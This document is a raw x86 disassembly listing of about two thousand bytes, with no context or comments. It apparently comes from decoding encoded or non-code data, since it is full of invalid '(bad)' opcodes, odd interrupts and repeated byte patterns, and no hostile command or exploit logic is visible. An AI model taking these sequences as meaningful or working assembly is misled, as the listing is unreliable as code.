  4232f6:	mov    ch,cl
  4232f8:	jbe    0x4232f3
  4232fa:	int    0x8d
  4232fc:	stc    
  4232fd:	cmp    eax,ebp
  4232ff:	cmp    ecx,DWORD PTR [edi]
  423301:	shl    edx,cl
  423303:	sub    bl,dl
  423305:	mov    ebp,0xcdd35392
  42330a:	lea    esi,[ebp+0x43]
  42330d:	shr    DWORD PTR [edi],cl
  42330f:	add    eax,0x80805300
  423314:	int    0x76
  423316:	stc    
  423317:	int    0x8d
  423319:	stc    
  42331a:	cmp    eax,ebp
  42331c:	cmp    ecx,DWORD PTR [edi]
  42331e:	shl    edx,cl
  423320:	sub    bl,dl
  423322:	mov    ebp,0xcdd35392
  423327:	(bad)  
  423328:	std    
  423329:	inc    ebx
  42332a:	shr    DWORD PTR [edi],cl
  42332c:	add    eax,0x808053ea
  423331:	int    0x76
  423333:	stc    
  423334:	int    0x8d
  423336:	stc    
  423337:	cmp    eax,ebp
  423339:	cmp    ecx,DWORD PTR [edi]
  42333b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423341:	push   ebx
  423342:	shr    esp,cl
  423344:	adc    al,0xcd
  423346:	lea    esi,[ebp+0x3bb596cd]
  42334c:	or     al,0x3b
  42334e:	cdq    
  42334f:	shr    ebx,cl
  423351:	xchg   edx,eax
  423352:	shr    edx,cl
  423354:	sub    BYTE PTR [ebx+0x13],dl
  423357:	xchg   ebx,edx
  423359:	int    0x8d
  42335b:	std    
  42335c:	inc    ebx
  42335d:	rol    DWORD PTR [edx-0x2893219],cl
  423363:	or     dh,BYTE PTR [esi-0x53]
  423366:	int    0x76
  423368:	jne    0x423374
  42336a:	jbe    0x42333c
  42336c:	ret    
  42336d:	dec    ecx
  42336e:	and    DWORD PTR [esi+0x45e60a35],eax
  423374:	leave  
  423375:	jbe    0x423314
  423377:	inc    ecx
  423378:	and    DWORD PTR [esi+0x4576cd35],eax
  42337e:	int    0x8d
  423380:	inc    ebp
  423381:	cmp    eax,ebp
  423383:	cmp    ecx,DWORD PTR [edi]
  423385:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42338b:	push   ebx
  42338c:	ror    DWORD PTR [edx],cl
  42338e:	jbe    0x4233e5
  423390:	int    0x76
  423392:	inc    ebp
  423393:	int    0x8d
  423395:	inc    ebp
  423396:	cmp    eax,ebp
  423398:	cmp    ecx,DWORD PTR [edi]
  42339a:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233a0:	push   ebx
  4233a1:	ror    DWORD PTR [edx],cl
  4233a3:	jbe    0x42333a
  4233a5:	leave  
  4233a6:	jbe    0x4233e5
  4233a8:	dec    eax
  4233a9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233af:	ret    0x8621
  4233b2:	xor    eax,0xcd4576cd
  4233b7:	lea    eax,[ebp+0x3b]
  4233ba:	lds    edi,FWORD PTR [ebx]
  4233bc:	psrlq  mm6,mm2
  4233bf:	sub    bl,dl
  4233c1:	mov    ebp,0xcdd35392
  4233c6:	lea    ebp,[ebp+0x52f7d43]
  4233cc:	push   ss
  4233cd:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233d3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233da:	cmp    eax,0x3b5596cd
  4233df:	jns    0x42341c
  4233e1:	or     al,0xd3
  4233e3:	lods   eax,DWORD PTR ds:[esi]
  4233e4:	sub    bl,dl
  4233e6:	jmp    0x42337a
  4233e8:	push   ebx
  4233e9:	jge    0x4233b8
  4233eb:	jbe    0x42339a
  4233ed:	xor    edx,edx
  4233ef:	cmp    ebx,edx
  4233f1:	clc    
  4233f2:	add    cl,BYTE PTR [edx]
  4233f4:	jbe    0x42338b
  4233f6:	int    0x76
  4233f8:	sbb    eax,0x3b1d8dcd
  4233fd:	lds    edi,FWORD PTR [ebx]
  4233ff:	psrlq  mm6,mm2
  423402:	sub    bl,dl
  423404:	mov    ebp,0xcdd35392
  423409:	lea    edx,[ebp+0x16d87d43]
  42340f:	int    0x76
  423411:	sbb    eax,0x3b1d8dcd
  423416:	lds    edi,FWORD PTR [ebx]
  423418:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42341f:	push   ebx
  423420:	ror    DWORD PTR [edx],cl
  423422:	jbe    0x4233b9
  423424:	int    0x76
  423426:	cmp    eax,0x3b3d8dcd
  42342b:	lds    edi,FWORD PTR [ebx]
  42342d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423434:	push   ebx
  423435:	ror    ebp,cl
  423437:	lea    edx,[ebp+0xad3d12f]
  42343d:	jbe    0x4233d4
  42343f:	int    0x76
  423441:	inc    ebp
  423442:	int    0x8d
  423444:	inc    ebp
  423445:	cmp    eax,ebp
  423447:	cmp    ecx,DWORD PTR [edi]
  423449:	shl    edx,cl
  42344b:	sub    bl,dl
  42344d:	mov    ebp,0xcdd35392
  423452:	lea    edx,[ebp+0x52f7d43]
  423458:	pusha  
  423459:	xchg   edx,eax
  42345a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423461:	or     eax,0x875576cd
  423466:	jbe    0x423438
  423468:	or     ah,dh
  42346a:	xchg   ebp,eax
  42346b:	or     dh,BYTE PTR [esi+0x6d]
  42346e:	pop    ebp
  42346f:	inc    ecx
  423470:	and    DWORD PTR [esi+0x5d760a35],eax
  423476:	leave  
  423477:	jbe    0x42348e
  423479:	cmp    DWORD PTR [ecx],esp
  42347b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423481:	and    DWORD PTR [esi-0xe89f5cb],eax
  423487:	int    0x76
  423489:	xchg   ebp,eax
  42348a:	int    0x8d
  42348c:	xchg   ebp,eax
  42348d:	cmp    eax,ebp
  42348f:	cmp    ecx,DWORD PTR [edi]
  423491:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423497:	push   ebx
  423498:	ror    DWORD PTR [edx],cl
  42349a:	jbe    0x423519
  42349c:	int    0x6d
  42349e:	jmp    0x4234a6
  4234a0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234aa:	add    BYTE PTR [ebx],cl
  4234ac:	and    DWORD PTR [esi-0x369232cb],eax
  4234b2:	push   es
  4234b3:	xchg   esp,eax
  4234b4:	add    BYTE PTR [eax],al
  4234b6:	add    bh,dh
  4234b8:	and    DWORD PTR [esi-0x329232cb],eax
  4234be:	ins    DWORD PTR es:[edi],dx
  4234bf:	int    0x76
  4234c1:	icebp  
  4234c2:	int    0x8d
  4234c4:	icebp  
  4234c5:	cmp    eax,ebp
  4234c7:	cmp    ecx,DWORD PTR [edi]
  4234c9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234cf:	push   ebx
  4234d0:	ror    ebp,cl
  4234d2:	lea    edi,[ebp+0x2f]
  4234d5:	rcl    ebx,1
  4234d7:	int    0x8d
  4234d9:	ins    DWORD PTR es:[edi],dx
  4234da:	retf   0x8884
  4234dd:	or     DWORD PTR [esi-0x57],esi
  4234e0:	int    0x6d
  4234e2:	int    0x76
  4234e4:	icebp  
  4234e5:	int    0x8d
  4234e7:	icebp  
  4234e8:	cmp    ecx,DWORD PTR [edi]
  4234ea:	cmp    eax,ebp
  4234ec:	shl    edx,cl
  4234ee:	sub    bl,dl
  4234f0:	mov    ebp,0xcdd35392
  4234f5:	lea    edi,[ebp+0x2f]
  4234f8:	rcl    ebx,1
  4234fa:	int    0x8d
  4234fc:	adc    eax,0x3b1596cd
  423501:	or     al,0x3b
  423503:	cdq    
  423504:	shr    ebx,cl
  423506:	xchg   edx,eax
  423507:	shr    edx,cl
  423509:	sub    BYTE PTR [ebx+0x13],dl
  42350c:	xchg   ebx,edx
  42350e:	int    0x8d
  423510:	ins    DWORD PTR es:[edi],dx
  423511:	das    
  423512:	pop    ecx
  423513:	dec    esp
  423514:	mov    ch,cl
  423516:	push   es
  423517:	jo     0x423519
  423519:	add    BYTE PTR [eax],al
  42351b:	int    0x17
  42351d:	jo     0x42351f
  42351f:	add    BYTE PTR [eax],al
  423521:	cmp    eax,ebp
  423523:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423529:	jmp    0x2fd3:0x87d25328
  423530:	pop    ecx
  423531:	lea    ebp,[ecx-0x72f682c5]
  423537:	test   eax,0x76ca6dcd
  42353c:	test   eax,0xcdf18dcd
  423541:	xchg   esi,eax
  423542:	icebp  
  423543:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423546:	cdq    
  423547:	shr    edx,cl
  423549:	sub    bl,dl
  42354b:	jmp    0x4234df
  42354d:	push   ebx
  42354e:	adc    ecx,ebp
  423550:	xchg   esi,eax
  423551:	jge    0x423582
  423553:	rcl    DWORD PTR [ebx],1
  423555:	int    0x96
  423557:	ins    DWORD PTR es:[edi],dx
  423558:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42355f:	icebp  
  423560:	int    0x8d
  423562:	icebp  
  423563:	cmp    eax,ebp
  423565:	cmp    ecx,DWORD PTR [edi]
  423567:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42356d:	push   ebx
  42356e:	ror    ebp,cl
  423570:	lea    edi,[ebp+0x2f]
  423573:	rcl    ebx,1
  423575:	int    0x8d
  423577:	ins    DWORD PTR es:[edi],dx
  423578:	retf   0x8884
  42357b:	or     DWORD PTR [esi-0x57],esi
  42357e:	int    0x6d
  423580:	int    0x76
  423582:	icebp  
  423583:	int    0x8d
  423585:	icebp  
  423586:	cmp    eax,ebp
  423588:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42358e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423592:	int    0x8d
  423594:	jge    0x4235c5
  423596:	rcl    ebx,1
  423598:	int    0x8d
  42359a:	pop    ebp
  42359b:	int    0x96
  42359d:	pop    ebp
  42359e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235a1:	cdq    
  4235a2:	shr    ebx,cl
  4235a4:	xchg   edx,eax
  4235a5:	shr    edx,cl
  4235a7:	sub    BYTE PTR [ebx+0x13],dl
  4235aa:	xchg   ebx,edx
  4235ac:	int    0x8d
  4235ae:	ins    DWORD PTR es:[edi],dx
  4235af:	das    
  4235b0:	pop    ecx
  4235b1:	dec    esp
  4235b2:	mov    ch,cl
  4235b4:	push   es
  4235b5:	xchg   esp,eax
  4235b6:	add    BYTE PTR [eax],al
  4235b8:	add    ch,cl
  4235ba:	pop    ss
  4235bb:	xchg   esp,eax
  4235bc:	add    BYTE PTR [eax],al
  4235be:	add    BYTE PTR [ebx],bh
  4235c0:	lds    edi,FWORD PTR [ebx]
  4235c2:	cdq    
  4235c3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235c9:	push   ebx
  4235ca:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235d0:	test   eax,0x8d097d3b
  4235d5:	test   eax,0x76ca6dcd
  4235da:	test   eax,0xcdf18dcd
  4235df:	xchg   esi,eax
  4235e0:	icebp  
  4235e1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235e4:	cdq    
  4235e5:	shr    edx,cl
  4235e7:	sub    bl,dl
  4235e9:	jmp    0x42357d
  4235eb:	push   ebx
  4235ec:	adc    ecx,ebp
  4235ee:	xchg   esi,eax
  4235ef:	jge    0x423620
  4235f1:	rcl    DWORD PTR [ebx],1
  4235f3:	int    0x96
  4235f5:	ins    DWORD PTR es:[edi],dx
  4235f6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235fd:	xor    eax,0x3b358dcd
  423602:	(bad)  
  423604:	(bad)
  423607:	sub    bl,dl
  423609:	mov    ebp,0xcdd35392
  42360e:	lea    ebx,[ebp-0x33]
  423611:	xchg   esi,eax
  423612:	pop    ebp
  423613:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423616:	cdq    
  423617:	shr    ebx,cl
  423619:	xchg   edx,eax
  42361a:	shr    edx,cl
  42361c:	sub    BYTE PTR [ebx+0x13],dl
  42361f:	das    
  423620:	rcl    ebx,1
  423622:	xchg   DWORD PTR [esi+0x7d],esi
  423625:	or     dh,BYTE PTR [esi+0x7d]
  423628:	int    0x76
  42362a:	jge    0x4235f9
  42362c:	lea    ecx,ds:0xb2f7d43
  423632:	(bad)  
  423633:	inc    DWORD PTR [eax]
  423635:	add    ch,cl
  423637:	jbe    0x423696
  423639:	int    0x8d
  42363b:	pop    ebp
  42363c:	cmp    ecx,DWORD PTR [edi]
  42363e:	shl    edx,cl
  423640:	sub    BYTE PTR [ebx],bh
  423642:	(bad)
  423645:	xchg   edx,eax
  423646:	push   ebx
  423647:	ror    ebp,cl
  423649:	lea    ecx,ds:0xcdd3d12f
  42364f:	lea    edx,[ebp-0x142cf3c5]
  423655:	xchg   edx,eax
  423656:	push   ebx
  423657:	ror    ebp,cl
  423659:	lea    edx,[ebp-0xd2cf0c5]
  42365f:	sub    BYTE PTR [ebx-0x2d],dl
  423662:	or     dh,BYTE PTR [esi+0x35]
  423665:	int    0x76
  423667:	popf   
  423668:	int    0x8d
  42366a:	popf   
  42366b:	cmp    ecx,DWORD PTR [edi]
  42366d:	shl    edx,cl
  42366f:	sub    BYTE PTR [ebx],bh
  423671:	(bad)
  423674:	xchg   edx,eax
  423675:	push   ebx
  423676:	ror    ebp,cl
  423678:	lea    ebx,[ebp+0x3b9d96cd]
  42367e:	or     al,0xd3
  423680:	jmp    0x423614
  423682:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423688:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42368e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423694:	in     al,dx
  423695:	sbb    al,0xcd
  423697:	jbe    0x423636
  423699:	int    0x8d
  42369b:	popf   
  42369c:	cmp    eax,ebp
  42369e:	cmp    ecx,DWORD PTR [edi]
  4236a0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236a6:	push   ebx
  4236a7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236ad:	push   ebp
  4236ae:	int    0x76
  4236b0:	popf   
  4236b1:	int    0x8d
  4236b3:	popf   
  4236b4:	cmp    eax,ebp
  4236b6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236bc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236c0:	int    0x8d
  4236c2:	lods   eax,DWORD PTR ds:[esi]
  4236c3:	xor    edi,DWORD PTR [ebp-0x33]
  4236c6:	jbe    0x423665
  4236c8:	int    0x96
  4236ca:	popf   
  4236cb:	cmp    eax,ebp
  4236cd:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236d3:	mov    ebp,0xcdd25392
  4236d8:	xchg   esi,eax
  4236d9:	push   ebp
  4236da:	das    
  4236db:	rcl    edx,1
  4236dd:	inc    ebx
  4236de:	shr    DWORD PTR [edi],cl
  4236e0:	pop    es
  4236e1:	adc    ebp,edi
  4236e3:	add    BYTE PTR [eax],al
  4236e5:	int    0x76
  4236e7:	stc    
  4236e8:	int    0x76
  4236ea:	stc    
  4236eb:	int    0x76
  4236ed:	std    
  4236ee:	or     dh,BYTE PTR [esi+0x35]
  4236f1:	int    0x76
  4236f3:	mov    ch,cl
  4236f5:	lea    esp,ds:0x3b2596cd
  4236fb:	or     al,0xd3
  4236fd:	jmp    0x423691
  4236ff:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423705:	add    BYTE PTR [eax+0x5328ead3],0x13
  42370c:	jno    0x4236db
  42370e:	lea    esp,[ebp-0x33]
  423711:	xchg   esi,eax
  423712:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423716:	cdq    
  423717:	shr    ebx,cl
  423719:	xchg   edx,eax
  42371a:	shr    edx,cl
  42371c:	sub    BYTE PTR [ebx+0x13],dl
  42371f:	jno    0x4236ee
  423721:	(bad)  
  423722:	stc    
  423723:	int    0x96
  423725:	stc    
  423726:	add    dh,dl
  423728:	xor    eax,0x993b0c3b
  42372d:	shr    ebx,cl
  42372f:	xchg   edx,eax
  423730:	shr    edx,cl
  423732:	sub    BYTE PTR [ebx+0x13],dl
  423735:	jno    0x423737
  423737:	jo     0x42374d
  423739:	int    0x8d
  42373b:	stc    
  42373c:	int    0x96
  42373e:	stc    
  42373f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423742:	cdq    
  423743:	shr    ebx,cl
  423745:	xchg   edx,eax
  423746:	shr    edx,cl
  423748:	sub    BYTE PTR [ebx+0x13],dl
  42374b:	or     dh,BYTE PTR [esi+0x65]
  42374e:	inc    ebx
  42374f:	jge    0x423780
  423751:	add    eax,0x808080ab
  423756:	int    0x76
  423758:	stc    
  423759:	in     al,dx
  42375a:	(bad)  
  42375b:	int    0x96
  42375d:	or     dh,BYTE PTR gs:[esi-0x53]
  423761:	push   ecx
  423762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423763:	lods   eax,DWORD PTR ds:[esi]
  423764:	int    0x8d
  423766:	lods   eax,DWORD PTR ds:[esi]
  423767:	shr    ebx,cl
  423769:	xchg   edx,eax
  42376a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42376d:	lods   eax,DWORD PTR ds:[esi]
  42376e:	sub    BYTE PTR [ebx-0x2d],dl
  423771:	int    0x8d
  423773:	jne    0x42373f
  423775:	dec    esp
  423776:	or     DWORD PTR [ecx],0x8dcd304c
  42377c:	mov    ch,0xcd
  42377e:	lea    esi,[ebp+0x3bb596cd]
  423784:	or     al,0x3b
  423786:	cdq    
  423787:	shr    edx,cl
  423789:	sub    bl,dl
  42378b:	jmp    0x42371f
  42378d:	push   ebx
  42378e:	adc    ecx,ebp
  423790:	xchg   esi,eax
  423791:	mov    ch,0x87
  423793:	jge    0x423762
  423795:	jbe    0x423744
  423797:	cmp    edx,ebp
  423799:	add    al,0xad
  42379b:	std    
  42379c:	add    al,0xea
  42379e:	std    
  42379f:	shr    ebx,cl
  4237a1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237a7:	leave  
  4237a8:	int    0x8d
  4237aa:	std    
  4237ab:	int    0x96
  4237ad:	std    
  4237ae:	shr    edx,cl
  4237b0:	xchg   edx,eax
  4237b1:	shr    ebx,cl
  4237b3:	sub    BYTE PTR [ebx-0x1d],dl
  4237b6:	cmp    ebx,ecx
  4237b8:	inc    ebx
  4237b9:	rcl    dh,cl
  4237bb:	mov    ds:0xcd8876cd,eax
  4237c0:	lea    ebp,ds:0xcd2d96cd
  4237c6:	add    DWORD PTR [ecx],edx
  4237c8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237d2:	shr    edx,cl
  4237d4:	sub    BYTE PTR [ebx+0x13],dl
  4237d7:	jno    0x4237a6
  4237d9:	(bad)  
  4237da:	stc    
  4237db:	int    0x96
  4237dd:	stc    
  4237de:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237e1:	cdq    
  4237e2:	shr    ebx,cl
  4237e4:	xchg   edx,eax
  4237e5:	shr    edx,cl
  4237e7:	sub    BYTE PTR [ebx+0x13],dl
  4237ea:	jno    0x4237ec
  4237ec:	(bad)  
  4237ed:	jne    0x4237ef
  4237ef:	jo     0x42380d
  4237f1:	int    0x76
  4237f3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237f7:	int    0x76
  4237f9:	xor    eax,0xcdfd760a
  4237fe:	jbe    0x4237fd
  423800:	cmp    ecx,ebx
  423802:	add    al,0xbd
  423804:	test   ah,dl
  423806:	xor    ecx,ebp
  423808:	jbe    0x42387f
  42380a:	int    0x14
  42380c:	mov    ch,cl
  42380e:	jbe    0x423885
  423810:	int    0x84
  423812:	mov    BYTE PTR [ebx],bh
  423814:	jns    0x423851
  423816:	aad    0xd3
  423818:	lods   eax,DWORD PTR ds:[esi]
  423819:	sub    bl,dl
  42381b:	repz xchg edx,eax
  42381d:	push   ebx
  42381e:	ror    ch,cl
  423820:	xchg   esi,eax
  423821:	jne    0x42382d
  423823:	test   BYTE PTR [edx-0x33],cl
  423826:	jbe    0x423825
  423828:	add    al,0xd3
  42382a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423831:	xlat   BYTE PTR ds:[ebx]
  423832:	int    0x76
  423834:	std    
  423835:	cmp    ecx,ebx
  423837:	add    al,0xbd
  423839:	test   ah,dl
  42383b:	xor    ecx,ebp
  42383d:	jbe    0x4238b4
  42383f:	int    0x14
  423841:	mov    ch,cl
  423843:	jbe    0x4238ba
  423845:	int    0x84
  423847:	mov    BYTE PTR [ebx],bh
  423849:	jns    0x423886
  42384b:	aad    0xd3
  42384d:	lods   eax,DWORD PTR ds:[esi]
  42384e:	sub    bl,dl
  423850:	repz xchg edx,eax
  423852:	push   ebx
  423853:	ror    ch,cl
  423855:	xchg   esi,eax
  423856:	jne    0x423862
  423858:	test   BYTE PTR [edx-0x33],cl
  42385b:	jbe    0x42385a
  42385d:	add    al,0xd3
  42385f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423866:	xlat   BYTE PTR ds:[ebx]
  423867:	int    0x76
  423869:	jne    0x423875
  42386b:	jbe    0x42387a
  42386d:	int    0x76
  42386f:	mov    ch,0xcd
  423871:	lea    esi,[ebp+0xf3bc53b]
  423877:	shl    edx,cl
  423879:	sub    bl,dl
  42387b:	mov    ebp,0xcdd35392
  423880:	(bad)  
  423881:	stc    
  423882:	or     dh,BYTE PTR [esi+0x25]
  423885:	leave  
  423886:	jbe    0x423854
  423888:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42388f:	imul   edx,ebp,0x8d0a0c69
  423895:	gs adc bh,dl
  423898:	into   
  423899:	and    DWORD PTR [esi-0x32fad0cb],eax
  42389f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238a6:	sar    DWORD PTR [ebx],cl
  4238a8:	lds    ecx,FWORD PTR [edx]
  4238aa:	jbe    0x423859
  4238ac:	rol    esi,cl
  4238ae:	lods   eax,DWORD PTR ds:[esi]
  4238af:	xchg   edx,eax
  4238b0:	or     dh,BYTE PTR [esi-0x30]
  4238b3:	int    0xd3
  4238b5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238b8:	lods   eax,DWORD PTR ds:[esi]
  4238b9:	sub    BYTE PTR [ebx+0x76],dl
  4238bc:	lods   eax,DWORD PTR ds:[esi]
  4238bd:	retf   0x858c
  4238c0:	int3   
  4238c1:	das    
  4238c2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238cd:	retf   
  4238ce:	inc    ebx
  4238cf:	rcl    esi,cl
  4238d1:	jle    0x4238a0
  4238d3:	jbe    0x42388a
  4238d5:	int    0x8d
  4238d7:	mov    ch,0xcd
  4238d9:	jbe    0x423890
  4238db:	int    0x96
  4238dd:	mov    ch,0x3b
  4238df:	jns    0x42391c
  4238e1:	or     al,0xd3
  4238e3:	lods   eax,DWORD PTR ds:[esi]
  4238e4:	sub    bl,dl
  4238e6:	jmp    0x42387a
  4238e8:	push   ebx
  4238e9:	jge    0x4238b8
  4238eb:	jbe    0x423952
  4238ed:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238f0:	lods   eax,DWORD PTR ds:[esi]
  4238f1:	sub    BYTE PTR [ebx+0x76],dl
  4238f4:	lods   eax,DWORD PTR ds:[esi]
  4238f5:	cmp    edx,ebp
  4238f7:	xchg   DWORD PTR [ebp-0x33],edi
  4238fa:	jbe    0x4238cc
  4238fc:	add    al,0xea
  4238fe:	std    
  4238ff:	add    al,0xad
  423901:	std    
  423902:	shr    ebx,cl
  423904:	sub    BYTE PTR [edi+0x3b1353f1],al
  42390a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423911:	and    DWORD PTR [esi-0x323329cb],eax
  423917:	jbe    0x42393e
  423919:	in     al,dx
  42391a:	and    cl,ch
  42391c:	jbe    0x423917
  42391e:	int    0x8d
  423920:	stc    
  423921:	cmp    eax,ebp
  423923:	cmp    ecx,DWORD PTR [edi]
  423925:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42392b:	push   ebx
  42392c:	ror    ebp,cl
  42392e:	(bad)  
  42392f:	stc    
  423930:	int    0x96
  423932:	stc    
  423933:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423936:	cdq    
  423937:	shr    ebx,cl
  423939:	xchg   edx,eax
  42393a:	shr    edx,cl
  42393c:	sub    BYTE PTR [ebx+0x13],dl
  42393f:	inc    ebx
  423940:	jge    0x423971
  423942:	add    eax,0x80809223
  423947:	int    0x76
  423949:	or     eax,0xa886ccd
  42394e:	out    0xb5,al
  423950:	leave  
  423951:	jbe    0x423978
  423953:	mov    dl,0x21
  423955:	xchg   BYTE PTR ds:0x393576c9,dh
  42395b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423961:	dec    ecx
  423962:	mov    al,ds:0x76c93586
  423967:	lods   eax,DWORD PTR ds:[esi]
  423968:	imul   esp,DWORD PTR [ecx],0x76c93586
  42396e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423972:	xor    eax,0xcd3d760a
  423977:	jbe    0x423901
  423979:	int    0x8d
  42397b:	lods   eax,DWORD PTR ds:[esi]
  42397c:	int    0x96
  42397e:	lods   eax,DWORD PTR ds:[esi]
  42397f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423982:	jmp    0x423916
  423984:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42398a:	adc    esi,DWORD PTR [ecx-0x33]
  42398d:	lea    edx,[ebp+0x3b9596cd]
  423993:	or     al,0xd3
  423995:	jmp    0x423929
  423997:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42399d:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239a4:	jno    0x423973
  4239a6:	lea    esp,[ebp-0x33]
  4239a9:	xchg   esi,eax
  4239aa:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239ae:	cdq    
  4239af:	shr    ebx,cl
  4239b1:	xchg   edx,eax
  4239b2:	shr    edx,cl
  4239b4:	sub    BYTE PTR [ebx+0x13],dl
  4239b7:	jno    0x423986
  4239b9:	lea    esi,[ebp+0x3bb596cd]
  4239bf:	or     al,0x3b
  4239c1:	cdq    
  4239c2:	shr    ebx,cl
  4239c4:	xchg   edx,eax
  4239c5:	shr    edx,cl
  4239c7:	sub    BYTE PTR [ebx+0x13],dl
  4239ca:	jno    0x4239cc
  4239cc:	jo     0x4239e2
  4239ce:	or     dh,BYTE PTR [esi+0x65]
  4239d1:	int    0x76
  4239d3:	mov    ch,cl
  4239d5:	lea    ebp,[ebp+0x3bad96cd]
  4239db:	or     al,0xd3
  4239dd:	jmp    0x423971
  4239df:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239e5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239ec:	jno    0x4239bb
  4239ee:	lea    edx,[ebp+0x3b9596cd]
  4239f4:	or     al,0x3b
  4239f6:	cdq    
  4239f7:	shr    ebx,cl
  4239f9:	xchg   edx,eax
  4239fa:	shr    edx,cl
  4239fc:	sub    BYTE PTR [ebx+0x13],dl
  4239ff:	jno    0x4239ce
  423a01:	lea    esi,[ebp+0xb596cd]
  423a07:	(bad)  
  423a08:	cmp    eax,0x993b0c3b
  423a0d:	shr    ebx,cl
  423a0f:	xchg   edx,eax
  423a10:	shr    edx,cl
  423a12:	sub    BYTE PTR [ebx+0x13],dl
  423a15:	jno    0x423a17
  423a17:	jo     0x423a2d
  423a19:	int    0x8d
  423a1b:	mov    ch,0xa
  423a1d:	jbe    0x4239cc
  423a1f:	int    0x76
  423a21:	mov    ch,0x3b
  423a23:	or     al,0x3b
  423a25:	jns    0x4239fa
  423a27:	jmp    0x4239bb
  423a29:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a2f:	jbe    0x423a96
  423a31:	inc    ebx
  423a32:	jge    0x423a63
  423a34:	add    eax,0x8080853c
  423a39:	int    0x8d
  423a3b:	mov    ch,0xcd
  423a3d:	xchg   esi,eax
  423a3e:	mov    ch,0x3b
  423a40:	or     al,0x3b
  423a42:	cdq    
  423a43:	shr    ebx,cl
  423a45:	xchg   edx,eax
  423a46:	shr    edx,cl
  423a48:	sub    BYTE PTR [ebx+0x13],dl
  423a4b:	inc    ebx
  423a4c:	lea    ebp,[ebp-0x7ab2fad1]
  423a52:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a59:	and    eax,0x192ebd3
  423a5e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a64:	mov    ch,0xcd
  423a66:	lea    esi,[ebp+0x192ebd3]
  423a6c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a72:	lea    esi,ds:0xd3358dcd
  423a78:	jmp    0x423a0c
  423a7a:	add    DWORD PTR [edx],eax
  423a7c:	scas   eax,DWORD PTR es:[edi]
  423a7d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a81:	aaa    
  423a82:	sbb    al,0x0
  423a84:	add    BYTE PTR [eax],al
  423a86:	add    BYTE PTR [edi+esi*1],0x24
  423a8a:	add    BYTE PTR [eax],al
  423a8c:	add    BYTE PTR [eax+0x24cfcf],al
  423a92:	add    BYTE PTR [eax],al
  423a94:	jno    0x423a96
  423a96:	(bad)  
  423a97:	cmp    eax,0x1ccfcf
  423a9c:	add    BYTE PTR [eax],al
  423a9e:	add    dh,dl
  423aa0:	lods   eax,DWORD PTR ds:[esi]
  423aa1:	jno    0x423a70
  423aa3:	lea    ecx,ds:0xcd4c9100
  423aa9:	lea    esi,[ebp+0x4]
  423aac:	shl    DWORD PTR [eax],cl
  423aae:	jno    0x423b20
  423ab0:	mov    ebp,0xefef
  423ab5:	or     dh,BYTE PTR [esi-0x30]
  423ab8:	int    0x76
  423aba:	mov    ch,cl
  423abc:	lea    ebp,ds:0xcd2d96cd
  423ac2:	add    DWORD PTR [ecx],edx
  423ac4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423ace:	shr    edx,cl
  423ad0:	sub    BYTE PTR [ebx+0x13],dl
